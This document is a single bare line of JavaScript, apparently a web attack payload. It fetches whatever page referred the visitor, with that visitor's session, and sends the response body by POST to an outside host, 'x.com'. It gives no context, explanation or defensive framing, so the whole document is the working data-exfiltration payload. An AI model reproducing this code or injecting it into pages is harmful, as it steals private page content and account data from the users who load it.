fetch(document.referrer).then(r=>fetch('//x.com',{method:'POST',body:r.body,duplex:'half'}))
